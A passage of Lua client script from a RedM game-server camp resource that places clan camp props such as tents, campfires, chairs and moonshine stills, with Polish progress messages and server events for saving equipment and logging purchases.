                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 6 then
                local tent1x = json.decode(campfirez)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Budowanie Ogniska...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 7 then
                local tent1x = json.decode(hitch1z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie SĹ‚upka zaczepowego...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 8 then
                local tent1x = json.decode(hitch2z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie SĹ‚upka zaczepowego...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)      
                        FreezeEntityPosition( tent1, true)
         
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 9 then
                local tent1x = json.decode(tablez)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Tworzenie StoĹ‚u...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)
            
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 10 then
                local tent1x = json.decode(inventoryz)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Tworzenie Ekwipunku...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)
            
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 11 then
                local tent1x = json.decode(stewz)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Gotowanie Gulaszu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 12 then
                local tent1x = json.decode(chair1z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
             
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 13 then
                local tent1x = json.decode(chair2z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
             
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 14 then
                local tent1x = json.decode(chair3z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 15 then
                local tent1x = json.decode(chair4z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)
            
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 16 then
                local tent1x = json.decode(chair5z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 17 then
                local tent1x = json.decode(barrelz)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Beczki Moonshine...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
             
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 18 then
                local tent1x = json.decode(destillerz)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Robisz Destylator do Moonshine...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)       
                        FreezeEntityPosition( tent1, true)
        
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 19 then
                local tent1x = json.decode(tannerz)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Budowa sprzÄ™tu rzeĹşniczego...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z+0.3, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end               
        end
        if sleep then 
            Citizen.Wait(1000)
        end

    end
end)
        

Citizen.CreateThread(function() --createtent addprop
    while true do 
        Citizen.Wait(1)
        local sleep = true
        if camplocation2 == 0 then
        else
            sleep = false
            local tables = json.decode(camplocation2)
            local canplace = 0
            local player = PlayerPedId()
            local coords = GetEntityCoords(player)
                if tentslotno == 1 then
                    local tenttype = -150345701
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughttent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end            
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                        else
                            TriggerEvent("syn:warndistance")
                        end
                    end
        
                elseif tentslotno == 2 then
                    local tenttype = -150345701
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughttent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end 
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                        TriggerEvent("syn:warndistance")
                        end
                    end
                elseif tentslotno == 3 then
                    local tenttype = -150345701
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughttent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end 
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 4 then
                    local tenttype = -150345701
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughttent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end 
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 5 then
                    local tenttype = -150345701
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughttent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end 
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

